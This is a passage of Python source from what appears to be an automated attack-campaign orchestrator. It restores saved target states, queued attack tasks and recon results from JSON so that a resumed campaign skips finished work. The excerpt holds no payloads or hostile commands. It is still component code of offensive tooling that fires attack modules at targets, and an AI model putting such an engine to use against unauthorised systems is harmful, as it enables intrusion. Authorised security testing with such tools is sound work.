        embedded recon_result) and ``self._tasks`` (the task queue with
        statuses/priorities/chain links intact) from a state file previously
        written by ``save_state``. This is what lets a resumed campaign skip
        already-completed recon and not re-fire succeeded/failed modules.

        Returns True if state was loaded, False if the file is missing/empty/
        unreadable (so callers can treat a missing file as a fresh start
        rather than an error). Never raises on malformed content — a corrupt
        state file logs a warning and is treated as no state, so a bad file
        can't wedge the orchestrator out of starting.
        """
        if not path.exists():
            logger.info(f"load_state: no state file at {path} (fresh start)")
            return False
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, ValueError) as exc:
            logger.warning(f"load_state: corrupt state file {path} ({exc}); starting fresh")
            return False
        if not isinstance(data, dict):
            logger.warning(f"load_state: {path} is not a JSON object; starting fresh")
            return False

        states_data = data.get("states", {}) or {}
        tasks_data = data.get("tasks", {}) or {}
        # Restore the counter BEFORE any new task can be minted so resumed
        # campaigns do not re-issue ATK-00001 and clobber loaded task records.
        try:
            self._task_counter = int(data.get("task_counter", 0))
        except (TypeError, ValueError):
            self._task_counter = 0
        loaded_states = 0
        loaded_tasks = 0
        for target, sdict in states_data.items():
            if not isinstance(sdict, dict):
                continue
            try:
                self._states[str(target)] = AttackState.from_dict(sdict)
                loaded_states += 1
            except Exception as exc:  # defensive: one bad state shouldn't kill resume
                logger.warning(f"load_state: skipping state for {target} ({exc})")
        for tid, tdict in tasks_data.items():
            if not isinstance(tdict, dict):
                continue
            try:
                self._tasks[str(tid)] = AttackTask.from_dict(tdict)
                loaded_tasks += 1
            except Exception as exc:
                logger.warning(f"load_state: skipping task {tid} ({exc})")

        logger.info(
            f"Attack state loaded from {path} "
            f"({loaded_states} states, {loaded_tasks} tasks)"
        )
        return loaded_states > 0 or loaded_tasks > 0

    def stop(self) -> None:
        """Gracefully stop the orchestrator."""
        self._running = False
        logger.info("Orchestrator stop signal received")
